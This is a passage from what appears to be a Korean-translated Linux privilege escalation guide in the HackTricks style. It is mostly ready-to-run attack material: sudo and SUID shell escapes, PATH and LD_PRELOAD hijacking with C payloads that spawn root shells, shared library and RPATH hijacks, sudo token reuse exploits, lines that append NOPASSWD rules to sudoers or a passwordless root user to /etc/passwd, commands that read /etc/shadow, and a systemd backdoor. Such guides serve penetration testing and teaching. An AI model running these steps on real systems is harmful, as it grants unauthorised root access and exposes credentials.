사용자나 그룹이 지정되지 않은 정책은 보편적으로 적용되며, "default" 컨텍스트 정책은 다른 특정 정책에 의해 다루어지지 않는 모든 항목에 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**여기에서 D-Bus 통신을 enumerate하고 exploit하는 방법을 알아보세요:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 enumerate하고 머신의 위치를 파악하는 것은 항상 흥미롭습니다.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

항상 접근하기 전에 이전에 상호작용할 수 없었던 해당 머신에서 실행 중인 네트워크 서비스를 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic이 가능한지 확인하세요. 가능하다면 일부 credentials를 확보할 수 있습니다.
```
timeout 1 tcpdump
```
## 사용자

### 일반 열거

자신이 **누구**인지, 어떤 **privileges**를 가지고 있는지, 시스템에 어떤 **users**가 있는지, 이들 중 누가 **login**할 수 있고 누가 **root privileges**를 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

일부 Linux 버전은 **UID > INT_MAX**인 사용자가 권한을 상승시킬 수 있는 버그의 영향을 받았습니다. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**이를 악용하려면** 다음을 사용하세요: **`systemd-run -t /bin/bash`**

### 그룹

root 권한을 부여할 수 있는 어떤 그룹의 **멤버인지** 확인하세요:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 클립보드

가능하면 클립보드에 흥미로운 내용이 있는지 확인하세요
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 알려진 passwords

환경에서 어떤 **password**를 알고 있다면, 그 **password**로 각 **user**로 **login**을 시도해보세요.

### Su Brute

많은 noise를 발생시키는 것을 신경쓰지 않고 컴퓨터에 `su`와 `timeout` 바이너리가 존재한다면, [su-bruteforce](https://github.com/carlospolop/su-bruteforce)를 사용해 user에 대해 brute-force를 시도해볼 수 있습니다.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)는 `-a` 파라미터로도 users에 대해 brute-force를 시도합니다.

## 쓰기 가능한 PATH 오용

### $PATH

만약 $PATH의 어떤 폴더 안에 **write할 수 있다면** 다른 **user**(이상적으로는 **root**)가 실행할 명령의 이름으로 writable 폴더 안에 **backdoor**를 만들어 **escalate privileges**할 수 있습니다. 단, 해당 명령이 $PATH에서 당신의 writable 폴더보다 앞선 폴더에서 로드되지 않아야 합니다.

### SUDO 및 SUID

어떤 명령을 **sudo**로 실행할 수 있거나 해당 파일에 **suid** 비트가 설정되어 있을 수 있습니다. 다음 명령으로 확인하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령은 파일을 읽고/또는 쓸 수 있게 하거나 명령을 실행할 수도 있습니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 구성에 따라 사용자가 비밀번호를 알지 못해도 다른 사용자의 권한으로 특정 명령을 실행할 수 있게 허용될 수 있다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예에서 사용자 `demo`는 `vim`을 `root`로 실행할 수 있으므로, root 디렉터리에 ssh key를 추가하거나 `sh`를 호출하여 shell을 얻는 것은 이제 매우 쉽습니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시문은 사용자가 어떤 것을 실행하는 동안 **환경 변수를 설정**할 수 있도록 허용합니다:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **HTB machine Admirer 기반**으로, 스크립트를 root로 실행할 때 임의의 python 라이브러리를 로드하도록 **PYTHONPATH hijacking**에 **취약했습니다:**
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 실행 우회 경로

**점프**하여 다른 파일을 읽거나 **symlinks**를 사용하세요. 예: sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\_*
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **wildcard**가 사용된다면 (\*), 훨씬 더 쉽습니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 명령/SUID 바이너리 (명령 경로 없이)

만약 **sudo permission**이 단일 명령에 **경로를 지정하지 않고** 부여되어 있다면: _hacker10 ALL= (root) less_ PATH 변수를 변경하여 이를 악용할 수 있습니다.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기술은 **suid** 바이너리가 **경로를 지정하지 않고 다른 명령을 실행하는 경우(항상 _**strings**_ 로 이상한 SUID 바이너리의 내용을 확인하세요)**).

[Payload examples to execute.](payloads-to-execute.md)

### 명령 경로가 있는 SUID 바이너리

만약 **suid** 바이너리가 **경로를 지정하여 다른 명령을 실행한다면**, suid 파일이 호출하는 명령 이름으로 **함수를 export** 해볼 수 있습니다.

예를 들어, 만약 suid 바이너리가 _**/usr/sbin/service apache2 start**_ 를 호출한다면, 해당 함수를 생성하고 export 해야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
그러면 suid 바이너리를 호출할 때 이 함수가 실행됩니다

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 표준 C 라이브러리(`libc.so`)를 포함한 다른 모든 라이브러리보다 먼저 로더가 로드하도록 하나 이상의 공유 라이브러리(.so 파일)를 지정하는 데 사용됩니다. 이 과정을 라이브러리 프리로드라고 합니다.

그러나 시스템 보안을 유지하고 특히 **suid/sgid** 실행 파일에서 이 기능이 악용되는 것을 방지하기 위해 시스템은 다음과 같은 조건을 적용합니다:

- 실제 사용자 ID (_ruid_)와 유효 사용자 ID (_euid_)가 일치하지 않는 실행 파일에 대해서 로더는 **LD_PRELOAD**를 무시합니다.
- suid/sgid가 설정된 실행 파일의 경우, 표준 경로에 있으면서 suid/sgid가 설정된 라이브러리만 프리로드됩니다.

권한 상승은 `sudo`로 명령을 실행할 수 있고 `sudo -l`의 출력에 **env_keep+=LD_PRELOAD** 문구가 포함되어 있을 때 발생할 수 있습니다. 이 설정은 명령이 `sudo`로 실행될 때에도 **LD_PRELOAD** 환경 변수를 유지하고 인식하게 하여, 권한이 상승된 상태에서 임의의 코드가 실행될 가능성을 초래할 수 있습니다.
```
Defaults        env_keep += LD_PRELOAD
```
다음으로 저장: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 다음을 사용하여 **컴파일**합니다:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **escalate privileges** 실행
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 유사한 privesc는 공격자가 **LD_LIBRARY_PATH** 환경 변수를 제어할 수 있는 경우 악용될 수 있습니다. 이는 공격자가 라이브러리를 검색할 경로를 제어하기 때문입니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID 바이너리 – .so injection

정상적이지 않아 보이는 **SUID** 권한을 가진 바이너리를 발견했을 때, 해당 바이너리가 **.so** 파일을 제대로 로드하는지 확인하는 것이 좋습니다. 이는 다음 명령을 실행하여 확인할 수 있습니다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_와 같은 오류가 발생하면 잠재적 악용 가능성을 시사합니다.

이를 악용하려면 _"/path/to/.config/libcalc.c"_라는 C 파일을 생성한 다음, 다음 코드를 포함시킵니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일하고 실행하면 파일 권한을 조작하고 권한이 상승된 shell을 실행하여 권한을 상승시키는 것을 목표로 합니다.

위 C 파일을 shared object (.so) 파일로 컴파일하려면:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받은 SUID binary를 실행하면 exploit이 촉발되어 잠재적인 system compromise로 이어질 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리가 쓰기 가능한 폴더에서 라이브러리를 로드하는 SUID binary를 찾았으니, 필요한 이름으로 해당 폴더에 라이브러리를 생성합시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
다음과 같은 오류가 발생하면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
즉, 생성한 라이브러리는 `a_function_name`이라는 함수를 포함해야 합니다.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 는 공격자가 로컬 보안 제약을 우회하기 위해 악용할 수 있는 Unix 바이너리를 정리한 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/) 는 명령에 **인수만 주입할 수 있는** 경우에 관한 동일한 자료입니다.

이 프로젝트는 제한된 쉘을 탈출하고 권한을 상승하거나 유지하며, 파일을 전송하고 spawn bind and reverse shells를 생성하며 기타 포스트-익스플로잇 작업을 용이하게 만드는 Unix 바이너리의 정당한 기능들을 수집합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

비밀번호는 없지만 **sudo access**가 있는 경우, **sudo 명령 실행을 기다렸다가 세션 토큰을 하이재킹**하여 권한을 상승시킬 수 있습니다.

권한 상승을 위한 요구사항:

- 이미 사용자 "_sampleuser_"로 쉘을 가지고 있어야 합니다
- "_sampleuser_"는 **`sudo`를 사용해** 최근 **15분 이내**에 무언가를 실행한 적이 있어야 합니다 (기본적으로 이는 비밀번호 없이 `sudo`를 사용할 수 있게 해 주는 sudo 토큰의 지속 시간입니다)
- `cat /proc/sys/kernel/yama/ptrace_scope` 이 0 이어야 합니다
- `gdb`에 접근할 수 있어야 합니다 (업로드할 수 있어야 함)

(일시적으로 `ptrace_scope`를 활성화하려면 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`를 사용하거나 `/etc/sysctl.d/10-ptrace.conf`를 영구적으로 수정해 `kernel.yama.ptrace_scope = 0`으로 설정할 수 있습니다)

위 조건들이 모두 충족되면, **다음 도구를 사용해 권한을 상승시킬 수 있습니다:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`)는 _/tmp_에 `activate_sudo_token` 바이너리를 생성합니다. 이를 사용해 **세션에서 sudo 토큰을 활성화**할 수 있습니다 (자동으로 root shell을 얻지는 못합니다, `sudo su`를 실행하세요):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **두 번째 exploit** (`exploit_v2.sh`)는 _/tmp_에 sh shell을 생성하며, 이 sh shell은 **root가 소유하고 setuid가 설정된** 상태입니다
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **세 번째 exploit** (`exploit_v3.sh`)는 **sudoers file을 생성**하여 **sudo tokens를 영구화하고 모든 사용자가 sudo를 사용할 수 있도록 허용합니다**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

폴더 또는 그 안에 생성된 파일들에 대해 **쓰기 권한**이 있다면 이 바이너리 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)을 사용해 **사용자와 PID에 대한 sudo token을 생성**할 수 있습니다.\
예를 들어, 파일 _/var/run/sudo/ts/sampleuser_를 덮어쓸 수 있고 해당 사용자로 PID 1234인 셸을 가지고 있다면, 비밀번호를 알 필요 없이 다음과 같이 실행하여 **sudo 권한을 획득**할 수 있습니다:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

파일 `/etc/sudoers`와 `/etc/sudoers.d` 내부의 파일들은 누가 `sudo`를 사용할 수 있고 어떻게 사용할지를 구성합니다. 이 파일들은 **by default can only be read by user root and group root**.\
**If** 이 파일을 **read**할 수 있다면 **obtain some interesting information**를 얻을 수 있고, 어떤 파일에든 **write**할 수 있다면 **escalate privileges**할 수 있습니다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
쓰기 권한이 있으면 이 권한을 악용할 수 있다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이 권한들을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD용 `doas`와 같이 `sudo` 바이너리의 몇 가지 대안이 있습니다. 구성 파일은 `/etc/doas.conf`에서 확인하세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

특정 **user가 보통 machine에 접속해 `sudo`로 권한을 상승시키는 것을 알고 있고**, 해당 user 컨텍스트로 shell을 얻었다면, **새로운 sudo 실행 파일을 만들어** 먼저 당신의 코드를 root로 실행하고 그 다음 사용자 명령을 실행하게 할 수 있다. 그런 다음 해당 user 컨텍스트의 **$PATH**를 수정(예: .bash_profile에 새 경로 추가)하면 사용자가 sudo를 실행할 때 당신의 sudo 실행 파일이 실행된다.

Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

또는 다음과 같이 실행하는 방법도 있다:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 공유 라이브러리

### ld.so

파일 `/etc/ld.so.conf` 는 **로드되는 구성 파일들이 어디에서 오는지**를 나타냅니다. 일반적으로 이 파일에는 다음 경로가 포함됩니다: `include /etc/ld.so.conf.d/*.conf`

즉 `/etc/ld.so.conf.d/*.conf` 의 구성 파일들이 읽힙니다. 이 구성 파일들은 **다른 폴더들**을 가리키며, 그곳에서 **라이브러리**들이 **검색**됩니다. 예를 들어 `/etc/ld.so.conf.d/libc.conf` 의 내용이 `/usr/local/lib` 라면, **시스템은 `/usr/local/lib` 내부에서 라이브러리를 검색합니다**.

만약 어떤 이유로 지정된 경로들 중 어느 것에 대해 **사용자가 쓰기 권한을 가지고 있다면**: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 내부의 임의의 파일 또는 `/etc/ld.so.conf.d/*.conf` 내 구성 파일이 가리키는 어떤 폴더 등, 그는 권한 상승을 할 수 있습니다.\
다음 페이지에서 이 잘못된 구성을 **어떻게 악용하는지** 확인하세요:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib을 `/var/tmp/flag15/`에 복사하면 `RPATH` 변수에 지정된 대로 이 위치에서 프로그램에 의해 사용됩니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 악성 라이브러리를 생성합니다: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities는 프로세스에 부여되는 사용 가능한 root privileges의 **하위 집합(subset)** 을 제공합니다. 이것은 root 권한을 **작고 구분되는 단위들로 분해**하는 효과가 있습니다. 이러한 각 단위는 개별적으로 프로세스에 부여될 수 있습니다. 이로 인해 전체 권한 집합이 축소되어 exploitation의 위험이 줄어듭니다.\
다음 페이지를 읽어 **capabilities와 이를 악용하는 방법**에 대해 더 알아보세요:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

디렉토리에서, **bit for "execute"** 는 해당 사용자가 폴더로 **"cd"** 할 수 있음을 의미합니다.\
**"read"** 비트는 사용자가 **list** 할 수 있음을 의미하고, **"write"** 비트는 사용자가 **delete** 및 새 **files** 를 **create** 할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 임의 권한의 2차 계층을 나타내며, 전통적인 ugo/rwx 권한을 **overriding** 할 수 있습니다. 이러한 권한은 소유자나 그룹의 일부가 아닌 특정 사용자에게 접근 권한을 허용하거나 거부함으로써 파일 또는 디렉토리 접근 제어를 보다 세밀하게 강화합니다. 이 수준의 **granularity는 보다 정밀한 접근 관리**를 보장합니다. 자세한 내용은 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인하세요.

**Give** 사용자 "kali"에게 파일에 대한 read 및 write 권한을 부여:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**가져오기** 시스템에서 특정 ACLs를 가진 파일:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 열린 shell sessions

**이전 버전**에서는 다른 사용자(**root**)의 일부 **shell** session을 **hijack**할 수 있습니다.\
**최신 버전**에서는 **your own user**의 screen sessions에만 **connect**할 수 있습니다. 하지만 **세션 내부의 흥미로운 정보**를 찾을 수 있습니다.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**세션에 연결**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux 세션 가로채기

이는 **old tmux versions**의 문제였습니다. 권한이 없는 사용자로서 root가 생성한 tmux (v2.1) 세션을 가로챌 수 없었습니다.

**tmux 세션 나열**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**세션에 연결**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
예시로 **Valentine box from HTB**를 확인하세요.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006년 9월부터 2008년 5월 13일 사이에 Debian 기반 시스템(Ubuntu, Kubuntu 등)에서 생성된 모든 SSL 및 SSH 키는 이 버그의 영향을 받을 수 있습니다.\
이 버그는 해당 OS에서 새 ssh 키를 생성할 때 발생하는데, **가능한 경우의 수가 단 32,768가지뿐이었기 때문**입니다. 즉 모든 경우의 수를 계산할 수 있으며 **ssh public key를 알고 있다면 해당 private key를 검색할 수 있습니다**. 계산된 경우의 수는 다음에서 확인할 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 패스워드 인증을 허용할지 여부를 지정합니다. 기본값은 `no`입니다.
- **PubkeyAuthentication:** public key authentication을 허용할지 여부를 지정합니다. 기본값은 `yes`입니다.
- **PermitEmptyPasswords**: 패스워드 인증이 허용될 때, 서버가 빈 문자열인 패스워드를 가진 계정으로의 로그인을 허용할지 여부를 지정합니다. 기본값은 `no`입니다.

### PermitRootLogin

root가 ssh로 로그인할 수 있는지 여부를 지정합니다(기본값 `no`). 가능한 값:

- `yes`: root가 password와 private key를 사용해 로그인할 수 있습니다.
- `without-password` or `prohibit-password`: root는 private key로만 로그인할 수 있습니다.
- `forced-commands-only`: root는 private key로만 로그인할 수 있으며, commands 옵션이 지정된 경우에만 허용됩니다.
- `no` : root 로그인 불가

### AuthorizedKeysFile

AuthorizedKeysFile 설정은 사용자 인증에 사용할 수 있는 public keys를 포함한 파일들을 지정합니다. `%h` 같은 토큰을 포함할 수 있으며, 이 토큰은 사용자의 home 디렉토리로 치환됩니다. **절대 경로를 지정할 수 있습니다** (루트 `/`로 시작) 또는 **사용자 홈에서의 상대 경로**를 지정할 수 있습니다. 예:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
해당 구성은 사용자가 "**testusername**"의 **private** 키로 로그인하려고 하면 ssh가 당신 키의 public key를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 있는 키들과 비교할 것임을 나타냅니다.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding은 서버에 (without passphrases!) 키를 두지 않고도 **use your local SSH keys instead of leaving keys** 할 수 있게 해줍니다. 따라서 ssh를 통해 **jump** **to a host** 할 수 있고, 그곳에서 **jump to another** 호스트를 **using** 해당 **key**가 위치한 당신의 **initial host**를 이용해 접근할 수 있습니다.

이 옵션을 `$HOME/.ssh.config`에 다음과 같이 설정해야 합니다:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 흥미로운 파일

### 프로필 파일

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
이상한 프로필 스크립트가 발견되면 **민감한 정보**가 있는지 확인해야 합니다.

### Passwd/Shadow 파일

OS에 따라 `/etc/passwd` 및 `/etc/shadow` 파일이 다른 이름을 사용하거나 백업본이 있을 수 있습니다. 따라서 **모두 찾고**, **읽을 수 있는지 확인하여** 파일 내부에 **해시가 있는지** 확인하는 것이 권장됩니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
어떤 경우에는 **password hashes**를 `/etc/passwd` (또는 동등한) 파일 안에서 찾을 수 있습니다.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 쓰기 가능한 /etc/passwd

먼저, 다음 명령어 중 하나로 비밀번호를 생성합니다.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
그런 다음 사용자 `hacker`를 추가하고 생성된 비밀번호를 설정하세요.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
예: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

이제 `su` 명령을 `hacker:hacker`로 사용할 수 있습니다.

또는, 다음 줄을 사용하여 비밀번호 없는 더미 사용자를 추가할 수 있습니다.\\
경고: 현재 시스템의 보안이 저하될 수 있습니다.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
참고: BSD 플랫폼에서는 `/etc/passwd`가 `/etc/pwd.db` 및 `/etc/master.passwd`에 위치하며, `/etc/shadow`는 `/etc/spwd.db`로 이름이 변경됩니다.

일부 민감한 파일에 **쓰기가 가능한지** 확인해야 합니다. 예를 들어, 일부 **서비스 구성 파일**에 쓸 수 있습니까?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
예를 들어, 머신에서 **tomcat** 서버가 실행 중이고 **modify the Tomcat service configuration file inside /etc/systemd/,** 라면 다음 줄들을 수정할 수 있습니다:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
당신의 backdoor는 tomcat이 다음에 시작될 때 실행됩니다.

### 폴더 확인

다음 폴더에는 백업이나 흥미로운 정보가 들어있을 수 있습니다: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (마지막 것은 읽을 수 없을 가능성이 높지만 시도해보세요)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 이상한 위치/Owned 파일들
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
